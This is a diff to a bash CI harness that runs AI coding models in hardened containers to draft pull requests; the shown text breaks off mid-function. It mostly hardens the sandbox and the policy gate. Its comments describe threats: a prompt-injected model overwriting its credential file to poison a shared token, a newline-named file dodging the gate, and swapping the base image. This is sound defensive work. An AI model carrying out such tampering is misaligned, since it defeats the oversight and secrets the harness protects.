@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# [GPT-5.6] REG-3 live harness, local policy gate, target DRAFT-PR publisher, cross-provider
+# REG-3 live harness, local policy gate, target DRAFT-PR publisher, cross-provider
 # review/fix runners, and rotation write-back.
 # Secrets are accepted only through the environment/private files; xtrace must never be enabled.
 # The model container NEVER receives a GitHub token in any mode (see _run_headless_harness).
@@ -46,19 +46,25 @@ write_output() {
 # content — tool names come from a fixed allowlist and every value is numeric. Best-effort: a
 # telemetry failure must never fail (or change the exit class of) the model run.
 _extract_usage_telemetry() {
-  local model_log=$1 harness=$2 worker_root=$3
+  local model_log=$1 harness=$2 worker_root=$3 wall_seconds=$4
   local out="$worker_root/usage-telemetry.json"
   [[ -f "$model_log" ]] || return 0
-  python3 - "$model_log" "$harness" "$out" <<'PY' || return 0
+  python3 - "$model_log" "$harness" "$out" "$wall_seconds" <<'PY' || return 0
 import json
 import sys
 
-log_path, harness, out_path = sys.argv[1:]
+log_path, harness, out_path, wall_raw = sys.argv[1:]
 TOOL_ALLOWLIST = ("Read", "Bash", "Edit", "Write", "Glob", "Grep", "WebFetch", "WebSearch", "Task")
 usage = {}
 cost = None
 turns = None
 tool_counts = {}
+try:
+    wall_seconds = int(wall_raw)
+except ValueError:
+    raise SystemExit(0)
+if wall_seconds < 0:
+    raise SystemExit(0)
 
 
 def take_usage(candidate):
@@ -114,7 +120,8 @@ for line in text.splitlines():
         elif message.get("type") == "token_count":
             take_usage(message)
 
-document = {"harness": harness, "usage": usage, "total_cost_usd": cost,
+document = {"harness": harness, "usage": usage, "wall_seconds": wall_seconds,
+            "total_cost_usd": cost,
             "num_turns": turns, "tool_counts": tool_counts}
 with open(out_path, "w", encoding="utf-8") as handle:
     json.dump(document, handle, sort_keys=True)
@@ -130,6 +137,45 @@ PY
       } >> "$GITHUB_STEP_SUMMARY"
     fi
   fi
+}
+
+# Emit the numeric-only no-change metadata through the existing sanitized reset-hint handoff to
+# the separate no-target-code model_health job. That job expands this envelope into typed ledger
+# fields; the envelope itself is never stored. Missing telemetry stays absent (best effort), while
+# the target issue is always present so same-task repetition cannot masquerade as account capping.
+_no_change_health_envelope() {
+  local telemetry_file=$1 issue_number=$2
+  python3 - "$telemetry_file" "$issue_number" <<'PY'
+import json
+import sys
+
+path, issue_raw = sys.argv[1:]
+if not issue_raw.isascii() or not issue_raw.isdigit() or not 1 <= int(issue_raw) <= 2_147_483_647:
+    raise SystemExit(1)
+try:
+    with open(path, encoding="utf-8") as handle:
+        document = json.load(handle)
+except (OSError, ValueError):
+    document = {}
+
+fields = [("issue", int(issue_raw))]
+usage = document.get("usage") if isinstance(document, dict) else None
+if isinstance(usage, dict):
+    for source, name in (("input_tokens", "input"), ("output_tokens", "output")):
+        value = usage.get(source)
+        if isinstance(value, int) and not isinstance(value, bool) and 0 <= value <= 1_000_000_000:
+            fields.append((name, value))
+wall = document.get("wall_seconds") if isinstance(document, dict) else None
+if isinstance(wall, int) and not isinstance(wall, bool) and 0 <= wall <= 7 * 24 * 3600:
+    fields.append(("wall", wall))
+# This is a protocol boundary, not a display string. Keep the producer locked to
+# model-health.py's exact ``no-change-v1 key:value,key:value`` grammar: ASCII-decimal values,
+# comma separators, and no whitespace inside the payload.
+payload = ",".join(f"{key}:{value}" for key, value in fields)
+if any(not str(value).isascii() or not str(value).isdigit() for _, value in fields):
+    raise SystemExit(1)
+print("no-change-v1 " + payload)
+PY
 }
 
 # Shared model launcher for run_model / run_review / run_fix. Builds the hardened container argv
@@ -150,6 +196,37 @@ _extract_reset_hint() {
   grep -aioE \
     '(resets?|try again|retry)([- ]?(at|on|in|after))?[ :]*([0-9]{4}-[0-9]{2}-[0-9]{2}([T ][0-9]{2}:[0-9]{2}(:[0-9]{2})?(Z|[+-][0-9]{2}:?[0-9]{2})?)?|[0-9]{1,2}:[0-9]{2}(:[0-9]{2})?( ?(am|pm))?( ?(utc|gmt))?|[0-9]{1,2} ?(am|pm)( ?(utc|gmt))?|[0-9]+(\.[0-9]+)?( ?(s|secs?|seconds?|m|mins?|minutes?|h|hrs?|hours?))?)' \
     "$signals_file" 2>/dev/null | head -n1 | tr -cd 'A-Za-z0-9 :,/+.()-' | cut -c1-80
+}
+
+# PURE (issue #134): emit the nested READ-ONLY bind mount that pins the selected account credential
+# immutable inside the model's container HOME. The credential HOME is mounted read-write so the CLI
+# can persist its own session/cache, but the credential FILE itself must never be writable by the
+# model: the container gives the model Bash/Write, and a prompt-injected model could otherwise
+# overwrite ~/.codex/auth.json (or ~/.claude/.credentials.json / ~/.claude/worker-token) with
+# attacker-chosen or invalid data, which the rotation write_back would then push to the central
+# ACCTNN_TOKEN secret — poisoning every later worker on that account. A read-only bind mount over
+# just that file (the same parent-rw + child-ro pattern as the read-only .git mount in
+# _run_headless_harness) makes the overwrite impossible at the source: the file becomes an active
+# mountpoint that cannot be written, unlinked, or renamed over from inside the container, so the
+# post-run credential is always exactly what worker-prep materialized — write_back asserts that
+# byte-identity and refuses to persist anything when it is violated. Fail closed: every supported
+# credential format materializes UNDER $worker_root/home; a credential anywhere else is an
+# unexpected layout we refuse to run with rather than leave writable.
+#
+# Issue #596: because this mount is (correctly) immutable, the CLI's own in-place token refresh
+# cannot happen in the container either — so for codex-auth-json the credential is refreshed on the
+# HOST before the container starts, and what is mounted here is a MINIMAL derived document carrying
+# a fresh access token and NO refresh token (see worker-prep.sh + broker-refresh.py). That closes a
+# second hole this mount never covered: `readonly` stops writes, not READS, and the model has
+# Bash/Read while it processes hostile PR content.
+_credential_mount_args() {
+  local worker_root=$1 credential_path=$2
+  local home_prefix="$worker_root/home/"
+  [[ "$credential_path" == "$home_prefix"* ]] ||
+    die 'credential is not under the mounted worker HOME; refusing to leave it model-writable'
+  local rel=${credential_path#"$home_prefix"}
+  [[ -n "$rel" && "$rel" != *..* ]] || die 'unsafe credential relative path'
+  printf '%s\n' --mount "type=bind,src=$credential_path,dst=/home/worker/$rel,readonly"
 }
 
 # mutation_mode:
@@ -243,10 +320,23 @@ _run_headless_harness() {
       die 'refusing to forward a GitHub token env into the model container'
   done
 
+  # issue #134: pin the account credential READ-ONLY inside the container (nested under the
+  # read-write HOME mount, exactly like the read-only .git mount above) so the untrusted model
+  # cannot overwrite it and poison the central secret through the rotation write_back. Fail closed:
+  # a malformed/absent mount (the helper rejected an out-of-HOME credential) stops the run rather
+  # than leaving the credential writable — the helper's own die() cannot halt the parent from inside
+  # a process substitution, so the element-count check below is the load-bearing guard.
+  local -a credential_mount=()
+  mapfile -t credential_mount < <(_credential_mount_args "$worker_root" "$credential_path")
+  [[ ${#credential_mount[@]} -eq 2 ]] ||
+    die 'credential read-only mount could not be built; refusing to run with a writable credential'
+  container+=("${credential_mount[@]}")
+
   local claude_tools='Bash,Edit,Read,Write,Glob,Grep'
   [[ "$mutation_mode" == deny ]] && claude_tools='Read,Glob,Grep'
 
-  local rc=0
+  local rc=0 harness_started_at harness_wall_seconds
+  harness_started_at=$(date +%s)
   case "$harness" in
     claude)
       (
@@ -300,7 +390,8 @@ _run_headless_harness() {
       ) || rc=$?
       ;;
   esac
-  _extract_usage_telemetry "$model_log" "$harness" "$worker_root" || true
+  harness_wall_seconds=$(( $(date +%s) - harness_started_at ))
+  _extract_usage_telemetry "$model_log" "$harness" "$worker_root" "$harness_wall_seconds" || true
   if [[ "$rc" -ne 0 ]]; then
     # [OPUS-4.8] canary diagnostic: emit ONLY a sanitized error CLASS (never the raw
     # model output/credential) so failures are debuggable without leaking secrets.
@@ -431,7 +522,23 @@ run_model() {
   fi
   [[ "$(git rev-parse HEAD)" == "$base_sha" ]] || die 'model created commits; worker requires edits only'
   [[ -z "$(git status --porcelain=v1 -- .beads 2>/dev/null)" ]] || die 'model modified forbidden .beads state'
-  [[ -n "$(git status --porcelain=v1 --untracked-files=all)" ]] || die 'model produced no repository changes'
+  if [[ -z "$(git status --porcelain=v1 --untracked-files=all)" ]]; then
+    local no_change_envelope
+    no_change_envelope=$(_no_change_health_envelope \
+      "$worker_root/usage-telemetry.json" "$issue_number") ||
+      no_change_envelope="no-change-v1 issue:$issue_number"
+    if [[ -n ${GITHUB_ENV:-} ]]; then
+      {
+        printf 'WORKER_EXIT_CLASS=no_change\n'
+        printf 'WORKER_RESET_HINT=%s\n' "$no_change_envelope"
+      } >> "$GITHUB_ENV"
+    fi
+    { [[ -n ${WORKER_OUTPUT_DIR:-} ]] && printf '%s\n' no_change > "$WORKER_OUTPUT_DIR/exit-class" ; } \
+      2>/dev/null || true
+    { [[ -n ${WORKER_OUTPUT_DIR:-} ]] && printf '%s\n' "$no_change_envelope" > \
+      "$WORKER_OUTPUT_DIR/reset-hint" ; } 2>/dev/null || true
+    die 'model produced no repository changes'
+  fi
   git diff --check
 
   git switch -c "$branch"
@@ -504,6 +611,62 @@ _resolve_gate_package() {
   printf 'degrade:%s\n' "$atom"
 }
 
+# PURE (self-tested): read `git status --porcelain=v1 -z` on stdin and print every changed path,
+# one per line. `-z` is the ONLY machine-safe form (issue #141): WITHOUT it, git shell-quotes any
+# path containing a space or control char — wrapping it in "..." — and renders a rename as
+# `XY  old -> new` on ONE line. The old `cut -c4-` parse therefore turned `crates/x y.rs` into the
+# literal token `"crates/x y.rs"` (the leading quote defeats `^crates/`) and collapsed a rename into
+# a single bogus `old -> new` token, either of which lets a model touch a gated path WITHOUT being
+# classified by the crate-scoped or registry-selftest gate. With `-z`, records are NUL-terminated
+# and NEVER quoted; a rename/copy record is `XY <dst>\0<src>\0` (two NUL fields, order reversed vs
+# the arrow form), so BOTH endpoints are emitted and validated (a move into OR out of a gated
+# prefix is caught). Reads stdin so the self-test can feed a NUL fixture with no git.
+# NEWLINE REFUSAL (#434 review r1): git also permits NEWLINE bytes in filenames, and EVERYTHING
+# downstream of this parser (command substitution, printf, mapfile, the classifiers) is
+# newline-framed — a path like `.github/workflows/evil\n.yml` would split into two fragments,
+# neither matching `.github/workflows/*.yml`, so a touched workflow/script would get NO direct
+# validation while the gate still passed (zero targets is legitimate for docs-only diffs). Such a
+# path cannot be represented in this framing, so the parser REFUSES it outright: every path
+# (rename endpoints included) is validated BEFORE anything is emitted, a violation exits non-zero
+# with NOTHING on stdout (even a status-blind caller classifies nothing), and both gate callers
+# `|| die` on the failure. A newline-named file has no legitimate use in this repo — refuse and
+# surface beats guess and proceed.
+_porcelain_changed_paths() {
+  python3 -c '
+import sys
+
+fields = sys.stdin.buffer.read().split(b"\0")
+paths = []
+i = 0
+n = len(fields)
+while i < n:
+    rec = fields[i]
+    i += 1
+    # `-z` is NUL-TERMINATED, so the element after the final NUL is empty; skip empties.
+    if len(rec) < 4:
+        continue
+    xy = rec[:2]          # index + worktree status columns
+    path = rec[3:]        # the space at rec[2] separates status from path
+    # a rename/copy (R or C in either column) carries its SOURCE path as the next NUL field:
+    # consume and emit it too so a rename of a gated file is not missed.
+    if b"R" in xy or b"C" in xy:
+        if i < n and fields[i]:
+            paths.append(fields[i])
+        i += 1
+    paths.append(path)
+# validate EVERY path before emitting ANY: a newline byte would break the record framing of
+# every downstream consumer, so it is unrepresentable here — refuse the whole parse.
+for p in paths:
+    if b"\n" in p:
+        sys.stderr.write(
+            "worker-live: changed path contains a newline byte, which the newline-framed "
+            "gate pipeline cannot represent (refusing, fail closed): %r\n" % (p,))
+        sys.exit(1)
+for p in paths:
+    sys.stdout.buffer.write(p + b"\n")
+'
+}
+
 run_gate() {
   require_target
   local profile=${GATE_PROFILE:-}
@@ -527,7 +690,8 @@ run_gate() {
         # docs-quality gate is the real backstop. But it is a REAL error if the diff actually
         # touches crate source with no crate label, so fail closed in that case.
         local changed_paths
-        changed_paths="$(git status --porcelain=v1 --untracked-files=all | cut -c4-)"
+        changed_paths="$(git status --porcelain=v1 --untracked-files=all -z | _porcelain_changed_paths)" \
+          || die 'crate-scoped gate: changed-path listing refused (fail closed)'
         if printf '%s\n' "$changed_paths" | grep -qE '^crates/|^Cargo\.toml$|^Cargo\.lock$'; then
           die 'crate-scoped gate requires an area:<crate> label (diff touches crate source)'
         fi
@@ -591,18 +755,82 @@ run_gate() {
   esac
 }
 
-# [OPUS-4.8] The registry-selftest gate body (extracted so the host self-test can exercise its
-# PURE selectors — touched-file classification + the suite list — without a live cargo/gh call).
-# FULL_SELFTEST_SUITE mirrors the scripts every recent registry wave self-tests; every touched
-# script that HAS a --self-test is additionally run so a change to it is validated directly.
-# NAMING NOTE (review round): the routing validator here is scripts/route-resolve.py (added by the
-# onboarding push) — there is NO scripts/routing-validate.py; do not reference that name in suite
-# lists or briefs.
-FULL_SELFTEST_SUITE="policy-resolve.py route-resolve.py ready-issues.py dispatch-plan.py \
-plan-snapshot.py triage.py dispatch-claim.py worker-pr.py worker-issue.py select-and-claim.py \
-groom.py account-usage.py usage-alert.py plan-alert.py dispatch-secrets-guard.py model-health.py \
-pat-validity.py broker-refresh.py \
-backfill-provenance.py dashboard-gen.py trust-gate.py worker-live.sh migrate-secrets.sh"
+# The registry-selftest gate body is extracted so the host self-test can exercise its PURE
+# selectors without a live cargo/gh call. Derive the full suite so adding a script with an
+# advertised --self-test entrypoint enrolls it automatically instead of requiring a conflict-prone
+# edit here.
+SELFTEST_MANIFEST="$SCRIPT_DIR/selftest-suite.txt"
+
+_read_selftest_list() {
+  local file=$1
+  [[ -f "$file" ]] || return 1
+  sed -e 's/[[:space:]]*#.*//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
+    -e '/^[[:space:]]*$/d' "$file"
+}
+
+_derive_full_selftest_suite() {
+  local scripts_dir=$1 manifest=$2 baseline_manifest=${3:-} baseline_retirements=${4:-}
+  local file base required enrolled advertised approved baseline
+  local -a suite=()
+  [[ -d "$scripts_dir" ]] || return 1
+  enrolled=$(_read_selftest_list "$manifest") || {
+    printf 'self-test manifest is missing: %s\n' "$manifest" >&2; return 1;
+  }
+  [[ -n "$enrolled" ]] || { printf 'self-test manifest is empty\n' >&2; return 1; }
+  [[ "$(printf '%s\n' "$enrolled" | sort -u | wc -l)" -eq "$(printf '%s\n' "$enrolled" | wc -l)" ]] || {
+    printf 'self-test manifest contains duplicate entries\n' >&2; return 1;
+  }
+  for file in "$scripts_dir"/*.py "$scripts_dir"/*.sh; do
+    [[ -f "$file" ]] || continue
+    case "$file" in
+      *.py)
+        grep -Eq '^[[:space:]]*[^#].*(add_argument\("--self-test"|"--self-test"[[:space:]]+in[[:space:]]+sys\.argv|sys\.argv\[[^]]+\][[:space:]]*==[[:space:]]*"--self-test")' "$file" || continue
+        ;;
+      *.sh)
+        grep -Eq '^[[:space:]]*(--self-test[[:space:]]*\|[[:space:]]*)?self-test\)' "$file" || continue
+        ;;
+    esac
+    base=${file##*/}
+    suite+=("$base")
+  done
+  advertised=$(printf '%s\n' "${suite[@]}" | sort)
+  for required in $enrolled; do
+    case " ${suite[*]} " in
+      *" $required "*) ;;
+      *) printf 'enrolled suite script %s is missing or lost its self-test entrypoint\n' "$required" >&2; return 1 ;;
+    esac
+  done
+  for required in $advertised; do
+    grep -Fxq "$required" <<< "$enrolled" || {
+      printf 'advertising script %s is not enrolled in the manifest\n' "$required" >&2; return 1;
+    }
+  done
+  if [[ -n "$baseline_manifest" ]]; then
+    baseline=$(_read_selftest_list "$baseline_manifest") || {
+      printf 'base-branch self-test manifest is unavailable: %s\n' "$baseline_manifest" >&2
+      return 1
+    }
+    approved=$(_read_selftest_list "$baseline_retirements") || {
+      printf 'base-branch retirement approvals are unavailable: %s\n' "$baseline_retirements" >&2
+      return 1
+    }
+    while IFS= read -r required; do
+      [[ -n "$required" ]] || continue
+      grep -Fxq "$required" <<< "$enrolled" && continue
+      grep -Fxq "$required" <<< "$approved" || {
+        printf 'suite entry %s was removed without prior base-branch retirement approval\n' "$required" >&2
+        return 1
+      }
+    done <<< "$baseline"
+  fi
+  ((${#suite[@]} > 0)) || return 1
+  printf '%s\n' "$enrolled" | paste -sd' ' -
+}
+
+# Base-branch retirement authorization is enforced by pr-gate.yml, whose caller materializes both
+# protected baseline files. The local gate still validates discovery and current enrollment.
+FULL_SELFTEST_SUITE=$(_derive_full_selftest_suite "$SCRIPT_DIR" "$SELFTEST_MANIFEST") ||
+  die 'registry-selftest gate: self-test manifest validation failed (fail closed)'
 
 # PURE: the touched paths (relative to the target root) that this gate must lint. Reads a
 # newline-delimited path list on stdin (the caller passes `git diff --name-only` output); the
@@ -615,8 +843,15 @@ _registry_selftest_targets() {
     case "$path" in
       scripts/*.py)
         base=${path#scripts/}
-        # only scripts that are part of the known self-testing suite are run (a data/helper py
-        # with no --self-test would otherwise fail closed spuriously)
+        # [issue #140] EVERY touched python file gets a direct py_compile syntax check. A non-suite
+        # helper/data py was previously classified into NOTHING and slipped through unvalidated while
+        # the always-run suite incremented the counter — so the gate could pass having validated only
+        # unrelated files. Emit a py: compile target for the actual change regardless of suite
+        # membership.
+        printf 'py:%s\n' "$path"
+        # A suite script is ADDITIONALLY run via --self-test (validates the change's behaviour, not
+        # just its syntax). A data/helper py with no --self-test stays compile-only — a spurious
+        # --self-test on it would fail closed for the wrong reason.
         case " $suite " in *" $base "*) printf 'self:%s\n' "$base" ;; esac
         ;;
       scripts/*.sh)
@@ -627,19 +862,229 @@ _registry_selftest_targets() {
       .github/workflows/*.yml|.github/workflows/*.yaml)
         printf 'wf:%s\n' "$path"
         ;;
+      # [issue #145] the model-isolation sandbox. A touched container definition was previously
+      # classified into NOTHING — the gate never looked at it — so a benign PR could swap the
+      # pinned base image for a mutable tag unchecked. Emit a dockerfile: target so the gate
+      # asserts its base images stay digest-pinned.
+      containers/*Dockerfile|containers/*.Dockerfile|containers/*.dockerfile)
+        printf 'dockerfile:%s\n' "$path"
+        ;;
     esac
   done
 }
 
+# PURE (self-tested): every external `FROM` in a container definition must pin its base image by a
+# FULLY LITERAL `@sha256:` + 64-hex digest — a mutable tag, a variable-expanded ref, or a
+# short/empty/non-hex digest is a supply-chain / model-isolation weakening (a benign-labelled PR
+# could repoint the worker sandbox at an attacker-controlled image, or defer the choice to a build
+# arg). Returns non-zero and names the first offending FROM. Multi-stage builds are honoured: a
+# `FROM <alias>` that references a prior `... AS <alias>` stage is allowed unpinned; leading
+# `--platform=`/`--flag` tokens are skipped.
+_assert_dockerfile_pinned() {
+  local file="$1"
+  [[ -f "$file" ]] || { printf 'worker-live: container definition missing: %s\n' "$file" >&2; return 1; }
+  local line lower img as_seen i j
+  local -A stage_alias=()
+  local -a toks
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    lower=$(printf '%s' "$line" | tr '[:upper:]' '[:lower:]')
+    [[ "$lower" =~ ^[[:space:]]*from[[:space:]] ]] || continue
+    read -r -a toks <<< "$line"
+    # first non-flag token after FROM is the base image ref
+    img=""; i=1
+    while [[ $i -lt ${#toks[@]} ]]; do
+      case "${toks[$i]}" in
+        --*) i=$((i + 1)) ;;
+        *) img="${toks[$i]}"; break ;;
+      esac
+    done
+    [[ -n "$img" ]] || { printf 'worker-live: FROM with no image in %s: %s\n' "$file" "$line" >&2; return 1; }
+    # capture an `AS <alias>` stage name (case-insensitive) for later multi-stage FROM refs
+    as_seen=""; j=$((i + 1))
+    while [[ $j -lt ${#toks[@]} ]]; do
+      if [[ "$(printf '%s' "${toks[$j]}" | tr '[:upper:]' '[:lower:]')" == as ]]; then
+        as_seen="${toks[$((j + 1))]:-}"; break
+      fi
+      j=$((j + 1))
+    done
+    if [[ -n "${stage_alias[$img]:-}" ]]; then
+      # a reference to a prior build stage — not an external base image, allowed unpinned
+      [[ -n "$as_seen" ]] && stage_alias[$as_seen]=1
+      continue
+    fi
+    # An external base image must be a FULLY LITERAL digest-pinned reference: no variable
+    # expansion (a `${BASE}` / `@sha256:${DIGEST}` lets a build arg pick the real image AFTER
+    # review), and it must end in `@sha256:` + exactly 64 hex chars. A bare `@sha256:` substring
+    # is not enough — that would accept a short, empty, or non-hex digest.
+    if [[ "$img" == *'$'* ]]; then
+      printf 'worker-live: base image ref uses variable expansion in %s: %s\n' "$file" "$img" >&2
+      return 1
+    fi
+    if [[ ! "$img" =~ @sha256:[0-9a-f]{64}$ ]]; then
+      printf 'worker-live: base image not digest-pinned in %s: %s\n' "$file" "$img" >&2
+      return 1
+    fi
+    [[ -n "$as_seen" ]] && stage_alias[$as_seen]=1
+  done < "$file"
+  return 0
+}
+
+# PURE (self-tested): print a workflow step's `if:` EXPRESSION selected by its `id:`. A GitHub
+# Actions `if` with no status function is implicitly wrapped in success(), so a post-gate step
+# written `if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}` is SILENTLY skipped when
+# an earlier step (the gate) fails. Post-gate token-refresh + followups steps must therefore carry an
+# explicit always() to survive a failed gate; this extractor lets the self-test assert that they do
+# (and that a genuinely gate-gated step like `pr` does NOT), catching a regression to implicit-success.
+# Buffers per step (a step spans `- name:` to the next `- name:`, or to the end of its JOB) and
+# returns the `if:` of the step containing the exact `id:`; empty when the step or its `if:` is
+# absent.
+#
+# [issue #575] The JOB boundary — a two-space-indented key — closes the step as well. Without it a
+# step that is the LAST one in its job never saw a closing `- name:`, so the scan ran on into the
+# following jobs and the END block reported whichever JOB-LEVEL `if:` it had seen most recently:
+# a confidently wrong expression for a step that has none of it. Every assertion built on this
+# extractor would then be measuring another job's condition.
+_workflow_step_if() {
+  local file="$1" id="$2"
+  [[ -f "$file" ]] || { printf 'worker-live: workflow file missing: %s\n' "$file" >&2; return 1; }
+  # `exit` also runs awk's END block, so guard the END print with `found` to avoid a double print.
+  awk -v id="$id" '
+    /^  [A-Za-z0-9_-]+:[[:space:]]*$/ {
+      if (started && has_id) { print ifv; found=1; exit }
+      started=0; has_id=0; ifv=""; next
+    }
+    /^[[:space:]]*-[[:space:]]+name:/ {
+      if (started && has_id) { print ifv; found=1; exit }
+      started=1; has_id=0; ifv=""; next
+    }
+    started && $0 ~ ("^[[:space:]]*id:[[:space:]]*" id "[[:space:]]*$") { has_id=1 }
+    started && /^[[:space:]]*if:/ { ln=$0; sub(/^[[:space:]]*if:[[:space:]]*/,"",ln); ifv=ln }
+    END { if (started && has_id && !found) print ifv }
+  ' "$file"
+}
+
+# PURE (self-tested): print every `GH_TOKEN:` assignment that appears AFTER the hostile gate step
+# and BEFORE the next job begins. Issue #575's whole finding is that gated, target-controlled code
+# ran in the same job as a token-bearing publisher; the invariant this encodes is that the worker
+# job holds NO token at all once the gate has run, so the expected output is EMPTY. The job
+# boundary is a two-space-indented `name:` key, which is why the isolated `publish` job's own
+# (legitimate) tokens are not counted.
+_tokens_after_gate() {
+  awk '
+    /worker-live\.sh gate$/ { after=1; next }
+    after && /^  [A-Za-z0-9_-]+:[[:space:]]*$/ { after=0 }
+    after && /^[[:space:]]*GH_TOKEN:/ { print }
+  ' "$1"
+}
+
+# [issue #140 review r1] The gate below FAILS CLOSED when a workflow changed and actionlint is
+# unavailable — so the worker lane must be able to provision actionlint itself, or every legitimate
+# workflow change dies at `command -v`. Provisioning mirrors .github/workflows/pr-gate.yml: the
+# SAME pinned release version + tarball sha256 (keep the two in sync when bumping). The pins are
+# hard-coded here and never read from the environment, so nothing PR- or env-controlled can swap
+# in a different artifact; a failed download, a checksum mismatch, or an arch with no pinned
+# checksum REFUSES and the gate still dies (the fail-closed behaviour is preserved, not weakened).
+# [#428 review r2] The EXTRACTED binary is pinned too (BIN sha, of the `actionlint` file inside
+# the pinned tarball) — it is what the cache fast path re-verifies on every reuse, so cached bytes
+# sit inside the same checksum boundary as a fresh download. When bumping the version, update BOTH
+# digests: tarball sha from the release checksums, binary sha via sha256sum of the extracted file.
+_ACTIONLINT_VERSION=1.7.7
+_ACTIONLINT_SHA256_LINUX_AMD64=023070a287cd8cccd71515fedc843f1985bf96c436b7effaecce67290e7e0757
+_ACTIONLINT_BIN_SHA256_LINUX_AMD64=9f7dedb4e23f89f2922073d1a6720405b7b520d4f5832ebb96f0d55a2958886c
+
+# _fetch_pinned_actionlint <dest_dir> <url> <tar_sha256> <bin_sha256>: download → sha256-verify
+# the tarball → extract into a FRESH temp dir → sha256-verify the extracted binary → atomically
+# rename it into dest → print the binary path. Refuses (rc 1, nothing printed) unless BOTH digests
+# match EXACTLY — nothing lands in dest before it is fully verified, and EVERY failure also evicts
+# any pre-existing dest binary, so a failed/partial provisioning can never leave bytes behind for
+# the cache fast path to trust. url/sha params exist only so the self-test can prove the accept
+# AND the refuse directions offline via file:// fixtures; the production caller
+# (_ensure_actionlint) always passes the hard-coded pins above.
+_fetch_pinned_actionlint() {
+  local dest=$1 url=$2 tar_sha256=$3 bin_sha256=$4
+  local tmpdir
+  mkdir -p -- "$(dirname -- "$dest")" || return 1
+  # sibling of dest → same filesystem, so the final mv is an atomic rename
+  tmpdir=$(mktemp -d -- "${dest}.tmp.XXXXXX") || return 1
+  if ! _fetch_pinned_actionlint_unpack "$tmpdir" "$url" "$tar_sha256" "$bin_sha256" \
+      || ! mkdir -p -- "$dest" \
+      || ! mv -f -- "$tmpdir/actionlint" "$dest/actionlint"; then
+    rm -rf -- "$tmpdir"
+    rm -f -- "$dest/actionlint" # fail closed: no partial/stale binary survives a failure
+    return 1
+  fi
+  rm -rf -- "$tmpdir"
+  printf '%s\n' "$dest/actionlint"
+}
+
+# helper for the above: all the steps that may fail mid-way, confined to the temp dir so the
+# caller can clean up uniformly. Never touches dest.
+_fetch_pinned_actionlint_unpack() {
+  local tmpdir=$1 url=$2 tar_sha256=$3 bin_sha256=$4
+  local tarball="$tmpdir/actionlint.tar.gz"
+  curl -fsSL --retry 3 -o "$tarball" "$url" || return 1
+  if ! printf '%s  %s\n' "$tar_sha256" "$tarball" | sha256sum -c - >/dev/null 2>&1; then
+    printf 'worker-live: actionlint artifact checksum MISMATCH — refusing it\n' >&2
+    return 1
+  fi
+  tar -C "$tmpdir" -xzf "$tarball" actionlint || return 1
+  [[ -x "$tmpdir/actionlint" ]] || return 1
+  if ! printf '%s  %s\n' "$bin_sha256" "$tmpdir/actionlint" | sha256sum -c - >/dev/null 2>&1; then
+    printf 'worker-live: extracted actionlint binary checksum MISMATCH — refusing it\n' >&2
+    return 1
+  fi
+}
+
+# _ensure_actionlint [bin_sha256 [url [tar_sha256]]]: print a usable actionlint path — a PATH copy
+# if one is already installed, else a cache copy that STILL matches the pinned binary digest, else
+# a fresh pinned download. rc 1 when none can be had; the gate then dies (fail closed) exactly as
+# when the tool was merely absent. [#428 review r2] the cache sits INSIDE the checksum boundary: a
+# cached binary is re-verified against the pinned binary digest on every reuse, and one that fails
+# (tampered, truncated, stale) is DISCARDED and re-provisioned — never executed. The optional
+# params exist only so the self-test can exercise the cache-verification and refusal paths offline
+# via fixtures; the sole production call site passes no arguments, so nothing PR- or
+# env-controlled can swap the pins.
+_ensure_actionlint() {
+  local bin_sha256=${1:-$_ACTIONLINT_BIN_SHA256_LINUX_AMD64}
+  local url=${2:-"https://github.com/rhysd/actionlint/releases/download/v${_ACTIONLINT_VERSION}/actionlint_${_ACTIONLINT_VERSION}_linux_amd64.tar.gz"}
+  local tar_sha256=${3:-$_ACTIONLINT_SHA256_LINUX_AMD64}
+  if command -v actionlint >/dev/null 2>&1; then
+    command -v actionlint
+    return 0
+  fi
+  local cache="${WORKER_TOOL_CACHE:-${HOME:-/tmp}/.cache/worker-tools}/actionlint-${_ACTIONLINT_VERSION}"
+  if [[ -e "$cache/actionlint" ]]; then
+    if [[ -x "$cache/actionlint" ]] \
+        && printf '%s  %s\n' "$bin_sha256" "$cache/actionlint" | sha256sum -c - >/dev/null 2>&1; then
+      printf '%s\n' "$cache/actionlint"
+      return 0
+    fi
+    printf 'worker-live: cached actionlint fails the pinned digest — discarding it\n' >&2
+    rm -f -- "$cache/actionlint"
+  fi
+  # the pinned checksums are the linux/amd64 release artifact; any other arch refuses rather than
+  # downloading a build we cannot verify (the guard applies to the no-arg production call — the
+  # self-test's fixture pins are arch-independent)
+  if [[ $# -eq 0 && "$(uname -m)" != x86_64 ]]; then
+    printf 'worker-live: no pinned actionlint checksum for arch %s (refusing)\n' "$(uname -m)" >&2
+    return 1
+  fi
+  printf 'worker-live: provisioning pinned actionlint v%s (sha256-verified)\n' "$_ACTIONLINT_VERSION" >&2
+  _fetch_pinned_actionlint "$cache" "$url" "$tar_sha256" "$bin_sha256"
+}
+
 registry_selftest_gate() {
   local changed
-  changed="$(git status --porcelain=v1 --untracked-files=all | cut -c4-)"
+  changed="$(git status --porcelain=v1 --untracked-files=all -z | _porcelain_changed_paths)" \
+    || die 'registry-selftest gate: changed-path listing refused (fail closed)'
   [[ -n "$changed" ]] || die 'registry-selftest gate: no changed files to validate (fail closed)'
   local -a targets=()
   mapfile -t targets < <(printf '%s\n' "$changed" | _registry_selftest_targets "$FULL_SELFTEST_SUITE")
 
-  local ran=0 t kind name
-  # 1) EVERY touched self-testing script, run directly (validates the change itself).
+  # `direct` counts validations of the ACTUAL touched files (targets); `ran` counts the always-run
+  # regression suite. Non-vacuity is measured against `direct`, never the suite — see the final gate.
+  local ran=0 direct=0 t kind name
+  # 1) EVERY touched self-testing script, run directly (validates the change's behaviour).
   for t in "${targets[@]}"; do
     kind=${t%%:*}; name=${t#*:}
     if [[ "$kind" == self ]]; then
@@ -649,12 +1094,27 @@ registry_selftest_gate() {
       else
         python3 "scripts/$name" --self-test || die "self-test failed: $name"
       fi
-      ran=$((ran + 1))
+      direct=$((direct + 1))
+    fi
+  done
+
+  # 1b) [issue #140] py_compile EVERY touched python file (suite or not). The previous gate only ran
+  #     a touched suite script's --self-test and left a non-suite helper/data py with NO direct check
+  #     — the always-run suite still incremented the counter, so the gate passed having validated only
+  #     unrelated files. A direct compile of the actual change closes that hole.
+  for t in "${targets[@]}"; do
+    kind=${t%%:*}; name=${t#*:}
+    if [[ "$kind" == py ]]; then
